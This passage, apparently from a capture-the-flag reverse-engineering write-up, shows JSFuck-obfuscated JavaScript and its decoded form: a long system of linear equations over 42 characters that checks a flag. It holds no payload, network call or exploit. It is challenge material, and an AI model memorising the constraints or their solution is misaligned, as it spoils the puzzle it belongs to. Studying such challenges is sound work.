]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+!+[]+[+[]+[!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])&amp;&amp;l[+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(+!+[]+[!+[]+!+[]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]])&quot;;ss=deEquation(s);document.write(ss);&lt;/script&gt; 解出来之后： 1l[40]+l[35]+l[34]-l[0]-l[15]-l[37]+l[7]+l[6]-l[26]+l[20]+l[19]+l[8]-l[17]-l[14]-l[38]+l[1]-l[9]+l[22]+l[41]+l[3]-l[29]-l[36]-l[25]+l[5]+l[32]-l[16]+l[12]-l[24]+l[30]+l[39]+l[10]+l[2]+l[27]+l[28]+l[21]+l[33]-l[18]+l[4]==861&amp;&amp;l[31]+l[26]+l[11]-l[33]+l[27]-l[3]+l[12]+l[30]+l[1]+l[32]-l[16]+l[7]+l[10]-l[25]+l[38]-l[41]-l[14]-l[19]+l[29]+l[36]-l[9]-l[28]-l[6]-l[0]-l[22]-l[18]+l[20]-l[37]+l[4]-l[24]+l[34]-l[21]-l[39]-l[23]-l[8]-l[40]+l[15]-l[35]==-448&amp;&amp;l[26]+l[14]+l[15]+l[9]+l[13]+l[30]-l[11]+l[18]+l[23]+l[7]+l[3]+l[12]+l[25]-l[24]-l[39]-l[35]-l[20]+l[40]-l[8]+l[10]-l[5]-l[33]-l[31]+l[32]+l[19]+l[21]-l[6]+l[1]+l[16]+l[17]+l[29]+l[22]-l[4]-l[36]+l[41]+l[38]+l[2]+l[0]==1244&amp;&amp;l[5]+l[22]+l[15]+l[2]-l[28]-l[10]-l[3]-l[13]-l[18]+l[30]-l[9]+l[32]+l[19]+l[34]+l[23]-l[17]+l[16]-l[7]+l[24]-l[39]+l[8]-l[12]-l[40]-l[25]+l[37]-l[35]+l[11]-l[14]+l[20]-l[27]+l[4]-l[33]-l[21]+l[31]-l[6]+l[1]+l[38]-l[29]==-39&amp;&amp;l[41]-l[29]+l[23]-l[4]+l[20]-l[33]+l[35]+l[3]-l[19]-l[21]+l[11]+l[26]-l[24]-l[17]+l[37]+l[1]+l[16]-l[0]-l[13]+l[7]+l[10]+l[14]+l[22]+l[39]-l[40]+l[34]-l[38]+l[32]+l[25]-l[2]+l[15]+l[6]+l[28]-l[8]-l[5]-l[31]-l[30]-l[27]==485&amp;&amp;l[13]+l[19]+l[21]-l[2]-l[33]-l[0]+l[39]+l[31]-l[23]-l[41]+l[38]-l[29]+l[36]+l[24]-l[20]-l[9]-l[32]+l[37]-l[35]+l[40]+l[7]-l[26]+l[15]-l[10]-l[6]-l[16]-l[4]-l[5]-l[30]-l[14]-l[22]-l[25]-l[34]-l[17]-l[11]-l[27]+l[1]-l[28]==-1068&amp;&amp;l[32]+l[0]+l[9]+l[14]+l[11]+l[18]-l[13]+l[24]-l[2]-l[15]+l[19]-l[21]+l[1]+l[39]-l[8]-l[3]+l[33]+l[6]-l[5]-l[35]-l[28]+l[25]-l[41]+l[22]-l[17]+l[10]+l[40]+l[34]+l[27]-l[20]+l[23]+l[31]-l[16]+l[7]+l[12]-l[30]+l[29]-l[4]==939&amp;&amp;l[19]+l[11]+l[20]-l[16]+l[40]+l[25]+l[1]-l[31]+l[28]-l[23]+l[14]-l[9]-l[27]+l[35]+l[39]-l[37]-l[8]-l[22]+l[5]-l[6]+l[0]-l[32]+l[24]+l[33]+l[29]+l[38]+l[15]-l[2]+l[30]+l[7]+l[12]-l[3]-l[17]+l[34]+l[41]-l[4]-l[13]-l[26]==413&amp;&amp;l[22]+l[4]-l[9]+l[34]+l[35]+l[17]+l[3]-l[24]+l[38]-l[5]-l[41]-l[31]-l[0]-l[25]+l[33]+l[15]-l[1]-l[10]+l[16]-l[29]-l[12]+l[26]-l[39]-l[21]-l[18]-l[6]-l[40]-l[13]+l[8]+l[37]+l[19]+l[14]+l[32]+l[28]-l[11]+l[23]+l[36]+l[7]==117&amp;&amp;l[32]+l[16]+l[3]+l[11]+l[34]-l[31]+l[14]+l[25]+l[1]-l[30]-l[33]-l[40]-l[4]-l[29]+l[18]-l[27]+l[13]-l[19]-l[12]+l[23]-l[39]-l[41]-l[8]+l[22]-l[5]-l[38]-l[9]-l[37]+l[17]-l[36]+l[24]-l[21]+l[2]-l[26]+l[20]-l[7]+l[35]-l[0]==-313&amp;&amp;l[40]-l[1]+l[5]+l[7]+l[33]+l[29]+l[12]+l[38]-l[31]+l[2]+l[14]-l[35]-l[8]-l[24]-l[39]-l[9]-l[28]+l[23]-l[17]-l[22]-l[26]+l[32]-l[11]+l[4]-l[36]+l[10]+l[20]-l[18]-l[16]+l[6]-l[0]+l[3]-l[30]+l[37]-l[19]+l[21]+l[25]-l[15]==-42&amp;&amp;l[21]+l[26]-l[17]-l[25]+l[27]-l[22]-l[39]-l[23]-l[15]-l[20]-l[32]+l[12]+l[3]-l[6]+l[28]+l[31]+l[13]-l[16]-l[37]-l[30]-l[5]+l[41]+l[29]+l[36]+l[1]+l[11]+l[24]+l[18]-l[40]+l[19]-l[35]+l[2]-l[38]+l[14]-l[9]+l[4]+l[0]-l[33]==289&amp;&amp;l[29]+l[31]+l[32]-l[17]-l[7]+l[34]+l[2]+l[14]+l[23]-l[4]+l[3]+l[35]-l[33]-l[9]-l[20]-l[37]+l[24]-l[27]+l[36]+l[15]-l[18]-l[0]+l[12]+l[11]-l[38]+l[6]+l[22]+l[39]-l[25]-l[10]-l[19]-l[1]+l[13]-l[41]+l[30]-l[16]+l[28]-l[26]==-117&amp;&amp;l[5]+l[37]-l[39]+l[0]-l[27]+l[12]+l[41]-l[22]+l[8]-l[16]-l[38]+l[9]+l[15]-l[35]-l[29]+l[18]+l[6]-l[25]-l[28]+l[36]+l[34]+l[32]-l[14]-l[1]+l[20]+l[40]-l[19]-l[4]-l[7]+l[26]+l[30]-l[10]+l[13]-l[21]+l[2]-l[23]-l[3]-l[33]==-252&amp;&amp;l[29]+l[10]-l[41]-l[9]+l[12]-l[28]+l[11]+l[40]-l[27]-l[8]+l[32]-l[25]-l[23]+l[39]-l[1]-l[36]-l[15]+l[33]-l[20]+l[18]+l[22]-l[3]+l[6]-l[34]-l[21]+l[19]+l[26]+l[13]-l[4]+l[7]-l[37]+l[38]-l[2]-l[30]-l[0]-l[35]+l[5]+l[17]==-183&amp;&amp;l[6]-l[8]-l[20]+l[34]-l[33]-l[25]-l[4]+l[3]+l[17]-l[13]-l[15]-l[40]+l[1]-l[30]-l[14]-l[28]-l[35]+l[38]-l[22]+l[2]+l[24]-l[29]+l[5]+l[9]+l[37]+l[23]-l[18]+l[19]-l[21]+l[11]+l[36]+l[41]-l[7]-l[32]+l[10]+l[26]-l[0]+l[31]==188&amp;&amp;l[3]+l[6]-l[41]+l[10]+l[39]+l[37]+l[1]+l[8]+l[21]+l[24]+l[29]+l[12]+l[27]-l[38]+l[11]+l[23]+l[28]+l[33]-l[31]+l[14]-l[5]+l[32]-l[17]+l[40]-l[34]+l[20]-l[22]-l[16]+l[19]+l[2]-l[36]-l[7]+l[18]+l[15]+l[26]-l[0]-l[4]+l[35]==1036&amp;&amp;l[28]-l[33]+l[2]+l[37]-l[12]-l[9]-l[39]+l[16]-l[32]+l[8]-l[36]+l[31]+l[10]-l[4]+l[21]-l[25]+l[18]+l[24]-l[0]+l[29]-l[26]+l[35]-l[22]-l[41]-l[6]+l[15]+l[19]+l[40]+l[7]+l[34]+l[17]-l[3]-l[13]+l[5]+l[23]+l[11]-l[27]+l[1]==328&amp;&amp;l[22]-l[32]+l[17]-l[9]+l[20]-l[18]-l[34]+l[23]+l[36]-l[35]-l[38]+l[27]+l[4]-l[5]-l[41]+l[29]+l[33]+l[0]-l[37]+l[28]-l[40]-l[11]-l[12]+l[7]+l[1]+l[2]-l[26]-l[16]-l[8]+l[24]-l[25]+l[3]-l[6]-l[19]-l[39]-l[14]-l[31]+l[10]==-196&amp;&amp;l[11]+l[13]+l[14]-l[15]-l[29]-l[2]+l[7]+l[20]+l[30]-l[36]-l[33]-l[19]+l[31]+l[0]-l[39]-l[4]-l[6]+l[38]+l[35]-l[28]+l[34]-l[9]-l[23]-l[26]+l[37]-l[8]-l[27]+l[5]-l[41]+l[3]+l[17]+l[40]-l[10]+l[25]+l[12]-l[24]+l[18]+l[32]==7&amp;&amp;l[34]-l[37]-l[40]+l[4]-l[22]-l[31]-l[6]+l[38]+l[13]-l[28]+l[8]+l[30]-l[20]-l[7]-l[32]+l[26]+l[1]-l[18]+l[5]+l[35]-l[24]-l[41]+l[9]-l[0]-l[2]-l[15]-l[10]+l[12]-l[36]+l[33]-l[16]-l[14]-l[25]-l[29]-l[21]+l[27]+l[3]-l[17]==-945&amp;&amp;l[12]-l[30]-l[8]+l[20]-l[2]-l[36]-l[25]-l[0]-l[19]-l[28]-l[7]-l[11]-l[33]+l[4]-l[23]+l[10]-l[41]+l[39]-l[32]+l[27]+l[18]+l[15]+l[34]+l[13]-l[40]+l[29]-l[6]+l[37]-l[14]-l[16]+l[38]-l[26]+l[17]+l[31]-l[22]-l[35]+l[5]-l[1]==-480&amp;&amp;l[36]-l[11]-l[34]+l[8]+l[0]+l[15]+l[28]-l[39]-l[32]-l[2]-l[27]+l[22]+l[16]-l[30]-l[3]+l[31]-l[26]+l[20]+l[17]-l[29]-l[18]+l[19]-l[10]+l[6]-l[5]-l[38]-l[25]-l[24]+l[4]+l[23]+l[9]+l[14]+l[21]-l[37]+l[13]-l[41]-l[12]+l[35]==-213&amp;&amp;l[19]-l[36]-l[12]+l[33]-l[27]-l[37]-l[25]+l[38]+l[16]-l[18]+l[22]-l[39]+l[13]-l[7]-l[31]-l[26]+l[15]-l[10]-l[9]-l[2]-l[30]-l[11]+l[41]-l[4]+l[24]+l[34]+l[5]+l[17]+l[14]+l[6]+l[8]-l[21]-l[23]+l[32]-l[1]-l[29]-l[0]+l[3]==-386&amp;&amp;l[0]+l[7]-l[28]-l[38]+l[19]+l[31]-l[5]+l[24]-l[3]+l[33]-l[12]-l[29]+l[32]+l[1]-l[34]-l[9]-l[25]+l[26]-l[8]+l[4]-l[10]+l[40]-l[15]-l[11]-l[27]+l[36]+l[14]+l[41]-l[35]-l[13]-l[17]-l[21]-l[18]+l[39]-l[2]+l[20]-l[23]-l[22]==-349&amp;&amp;l[10]+l[22]+l[21]-l[0]+l[15]-l[6]+l[20]-l[29]-l[30]-l[33]+l[19]+l[23]-l[28]+l[41]-l[27]-l[12]-l[37]-l[32]+l[34]-l[36]+l[3]+l[1]-l[13]+l[18]+l[14]+l[9]+l[7]-l[39]+l[8]+l[2]-l[31]-l[5]-l[40]+l[38]-l[26]-l[4]+l[16]-l[25]==98&amp;&amp;l[28]+l[38]+l[20]+l[0]-l[5]-l[34]-l[41]+l[22]-l[26]+l[11]+l[29]+l[31]-l[3]-l[16]+l[23]+l[17]-l[18]+l[9]-l[4]-l[12]-l[19]-l[40]-l[27]+l[33]+l[8]-l[37]+l[2]+l[15]-l[24]-l[39]+l[10]+l[35]-l[1]+l[30]-l[36]-l[25]-l[14]-l[32]==-412&amp;&amp;l[1]-l[24]-l[29]+l[39]+l[41]+l[0]+l[9]-l[19]+l[6]-l[37]-l[22]+l[32]+l[21]+l[28]+l[36]+l[4]-l[17]+l[20]-l[13]-l[35]-l[5]+l[33]-l[27]-l[30]+l[40]+l[25]-l[18]+l[34]-l[3]-l[10]-l[16]-l[23]-l[38]+l[8]-l[14]-l[11]-l[7]+l[12]==-95&amp;&amp;l[2]-l[24]+l[31]+l[0]+l[9]-l[6]+l[7]-l[1]-l[22]+l[8]-l[23]+l[40]+l[20]-l[38]-l[11]-l[14]+l[18]-l[36]+l[15]-l[4]-l[41]-l[12]-l[34]+l[32]-l[35]+l[17]-l[21]-l[10]-l[29]+l[39]-l[16]+l[27]+l[26]-l[3]-l[5]+l[13]+l[25]-l[28]==-379&amp;&amp;l[19]-l[17]+l[31]+l[14]+l[6]-l[12]+l[16]-l[8]+l[27]-l[13]+l[41]+l[2]-l[7]+l[32]+l[1]+l[25]-l[9]+l[37]+l[34]-l[18]-l[40]-l[11]-l[10]+l[38]+l[21]+l[3]-l[0]+l[24]+l[15]+l[23]-l[20]+l[26]+l[22]-l[4]-l[28]-l[5]+l[39]+l[35]==861&amp;&amp;l[35]+l[36]-l[16]-l[26]-l[31]+l[0]+l[21]-l[13]+l[14]+l[39]+l[7]+l[4]+l[34]+l[38]+l[17]+l[22]+l[32]+l[5]+l[15]+l[8]-l[29]+l[40]+l[24]+l[6]+l[30]-l[2]+l[25]+l[23]+l[1]+l[12]+l[9]-l[10]-l[3]-l[19]+l[20]-l[37]-l[33]-l[18]==1169&amp;&amp;l[13]+l[0]-l[25]-l[32]-l[21]-l[34]-l[14]-l[9]-l[8]-l[15]-l[16]+l[38]-l[35]-l[30]-l[40]-l[12]+l[3]-l[19]+l[4]-l[41]+l[2]-l[36]+l[37]+l[17]-l[1]+l[26]-l[39]-l[10]-l[33]+l[5]-l[27]-l[23]-l[24]-l[7]+l[31]-l[28]-l[18]+l[6]==-1236&amp;&amp;l[20]+l[27]-l[29]-l[25]-l[3]+l[28]-l[32]-l[11]+l[10]+l[31]+l[16]+l[21]-l[7]+l[4]-l[24]-l[35]+l[26]+l[12]-l[37]+l[6]+l[23]+l[41]-l[39]-l[38]+l[40]-l[36]+l[8]-l[9]-l[5]-l[1]-l[13]-l[14]+l[19]+l[0]-l[34]-l[15]+l[17]+l[22]==-114&amp;&amp;l[12]-l[28]-l[13]-l[23]-l[33]+l[18]+l[10]+l[11]+l[2]-l[36]+l[41]-l[16]+l[39]+l[34]+l[32]+l[37]-l[38]+l[20]+l[6]+l[7]+l[31]+l[5]+l[22]-l[4]-l[15]-l[24]+l[17]-l[3]+l[1]-l[35]-l[9]+l[30]+l[25]-l[0]-l[8]-l[14]+l[26]+l[21]==659&amp;&amp;l[21]-l[3]+l[7]-l[27]+l[0]-l[32]-l[24]-l[37]+l[4]-l[22]+l[20]-l[5]-l[30]-l[31]-l[1]+l[15]+l[41]+l[12]+l[40]+l[38]-l[17]-l[39]+l[19]-l[13]+l[23]+l[18]-l[2]+l[6]-l[33]-l[9]+l[28]+l[8]-l[16]-l[10]-l[14]+l[34]+l[35]-l[11]==-430&amp;&amp;l[11]-l[23]-l[9]-l[19]+l[17]+l[38]-l[36]-l[22]-l[10]+l[27]-l[14]-l[4]+l[5]+l[31]+l[2]+l[0]-l[16]-l[8]-l[28]+l[3]+l[40]+l[25]-l[33]+l[13]-l[32]-l[35]+l[26]-l[20]-l[41]-l[30]-l[12]-l[7]+l[37]-l[39]+l[15]+l[18]-l[29]-l[21]==-513&amp;&amp;l[32]+l[19]+l[4]-l[13]-l[17]-l[30]+l[5]-l[33]-l[37]-l[15]-l[18]+l[7]+l[25]-l[14]+l[35]+l[40]+l[16]+l[1]+l[2]+l[26]-l[3]-l[39]-l[22]+l[23]-l[36]-l[27]-l[9]+l[6]-l[41]-l[0]-l[31]-l[20]+l[12]-l[8]+l[29]-l[11]-l[34]+l[21]==-502&amp;&amp;l[30]-l[31]-l[36]+l[3]+l[9]-l[40]-l[33]+l[25]+l[39]-l[26]+l[23]-l[0]-l[29]-l[32]-l[4]+l[37]+l[28]+l[21]+l[17]+l[2]+l[24]+l[6]+l[5]+l[8]+l[16]+l[27]+l[19]+l[12]+l[20]+l[41]-l[22]+l[15]-l[11]+l[34]-l[18]-l[38]+l[1]-l[14]==853&amp;&amp;l[38]-l[10]+l[16]+l[8]+l[21]-l[25]+l[36]-l[30]+l[31]-l[3]+l[5]-l[15]+l[23]-l[28]+l[7]+l[12]-l[29]+l[22]-l[0]-l[37]-l[14]-l[11]+l[32]+l[33]-l[9]+l[39]+l[41]-l[19]-l[1]+l[18]-l[4]-l[6]+l[13]+l[